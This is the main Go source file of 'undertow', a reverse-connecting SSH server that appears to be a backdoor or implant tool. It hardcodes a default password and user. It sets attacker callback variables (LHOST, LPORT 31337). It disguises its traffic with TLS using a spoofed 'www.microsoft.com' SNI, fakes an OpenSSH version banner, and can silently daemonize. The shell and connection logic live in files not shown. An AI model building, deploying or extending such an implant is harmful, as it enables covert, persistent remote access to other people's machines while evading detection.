// undertow - a lightweight ssh server with a reverse connection feature
// Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package main

import (
	"fmt"
	"os"

	"github.com/gliderlabs/ssh"
)

// The following variables can be set via ldflags
var (
	localPassword = "letmeinbrudipls"
	authorizedKey = ""
	defaultShell  = "/bin/bash"
	version       = "1.4.0"
	LUSER         = "svc"
	LHOST         = ""
	LPORT         = "31337"
	BPORT         = "0"
	NOCLI         = ""
	TLS_WRAP      = ""                  // Set to enable TLS wrapping
	TLS_SNI       = "www.microsoft.com" // SNI for TLS ClientHello
	DAEMONIZE     = ""                  // Set to auto-detach on launch (for NOCLI builds)
)

func main() {
	if shouldDetach() {
		if err := detachProcess(); err != nil {
			fmt.Fprintf(os.Stderr, "Failed to detach: %v\n", err)
			os.Exit(1)
		}
		os.Exit(0)
	}

	var (
		p              = setupParameters(NOCLI, TLS_WRAP, TLS_SNI)
		forwardHandler = &ssh.ForwardedTCPHandler{}
		server         = ssh.Server{
			Version:                       "OpenSSH_8.9",
			Handler:                       createSSHSessionHandler(p.shell),
			PasswordHandler:               createPasswordHandler(localPassword),
			PublicKeyHandler:              createPublicKeyHandler(authorizedKey),
			LocalPortForwardingCallback:   createLocalPortForwardingCallback(p.noShell),
			ReversePortForwardingCallback: createReversePortForwardingCallback(),
			SessionRequestCallback:        createSessionRequestCallback(p.noShell),
			ChannelHandlers: map[string]ssh.ChannelHandler{
				"direct-tcpip": ssh.DirectTCPIPHandler,
				"session":      ssh.DefaultSessionHandler,
				"rs-info":      createExtraInfoHandler(),
			},
			RequestHandlers: map[string]ssh.RequestHandler{
				"tcpip-forward":        forwardHandler.HandleSSHRequest,
				"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
			},
			SubsystemHandlers: map[string]ssh.SubsystemHandler{
				"sftp": createSFTPHandler(),
			},
		}
	)

	run(p, &server)
}
